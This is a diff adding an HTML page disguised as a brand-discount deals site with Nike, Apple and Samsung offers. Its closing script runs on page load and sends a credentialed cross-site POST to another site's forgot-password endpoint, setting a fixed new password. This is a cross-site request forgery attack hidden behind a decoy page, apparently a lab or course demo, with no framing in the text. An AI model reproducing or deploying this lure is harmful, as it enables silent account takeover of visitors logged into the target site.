@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brand Discounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            padding: 2rem;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 3rem;
+            color: #333;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 1.1rem;
+        }
+
+        .deals-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .deal-card {
+            background: white;
+            border-radius: 12px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: transform 0.2s ease;
+        }
+
+        .deal-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .brand-logo {
+            width: 100%;
+            height: 120px;
+            background: #f8f8f8;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #444;
+        }
+
+        .discount-badge {
+            display: inline-block;
+            background: #ff4757;
+            color: white;
+            padding: 0.5rem 1rem;
+            border-radius: 25px;
+            font-weight: bold;
+            margin-bottom: 1rem;
+        }
+
+        .brand-name {
+            font-size: 1.25rem;
+            margin-bottom: 0.5rem;
+            color: #333;
+        }
+
+        .deal-description {
+            color: #666;
+            margin-bottom: 1rem;
+            line-height: 1.5;
+        }
+
+        .cta-button {
+            display: inline-block;
+            background: #2ecc71;
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border-radius: 6px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: background 0.2s ease;
+        }
+
+        .cta-button:hover {
+            background: #27ae60;
+        }
+
+        .expiry {
+            margin-top: 1rem;
+            color: #999;
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            body {
+                padding: 1rem;
+            }
+
+            .deals-container {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>Exclusive Brand Discountss</h1>
+        <p class="subtitle">Save big on your favorite brands</p>
+    </header>
+
+    <div class="deals-container">
+        <div class="deal-card">
+            <div class="brand-logo">Nike</div>
+            <span class="discount-badge">30% OFF</span>
+            <h2 class="brand-name">Nike Sports</h2>
+            <p class="deal-description">Get 30% off on all running shoes and athletic wear. Limited time offer!</p>
+            <a href="#" class="cta-button">Shop Now</a>
+            <p class="expiry">Expires in 3 days</p>
+        </div>
+
+        <div class="deal-card">
+            <div class="brand-logo">Apple</div>
+            <span class="discount-badge">15% OFF</span>
+            <h2 class="brand-name">Apple Store</h2>
+            <p class="deal-description">Special discount on MacBooks and iPads for students and educators.</p>
+            <a href="#" class="cta-button">Claim Offer</a>
+            <p class="expiry">Expires in 5 days</p>
+        </div>
+
+        <div class="deal-card">
+            <div class="brand-logo">Samsung</div>
+            <span class="discount-badge">25% OFF</span>
+            <h2 class="brand-name">Samsung Electronics</h2>
+            <p class="deal-description">Amazing deals on Galaxy smartphones and Smart TVs.</p>
+            <a href="#" class="cta-button">Get Deal</a>
+            <p class="expiry">Expires in 7 days</p>
+        </div>
+
+
+
+    </div>
+
+    <script>
+        async function changePassword() {
+            try {
+                const res = await fetch("https://api.codersgyan.test/forgot-password", {
+                    method: "POST",
+                    credentials: "include",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ email: "user@example.com", newPassword: "coders666" })
+                });
+
+                const data = await res.json();
+
+                if (res.ok) {
+                    alert("Password changed successfully!");
+                } else {
+                    alert(data.message);
+                }
+            } catch (error) {
+                console.error("Error changing password:", error);
+                alert("An error occurred. Please try again.");
+            }
+        }
+
+        changePassword()
+    </script>
+</body>
+
+</html>
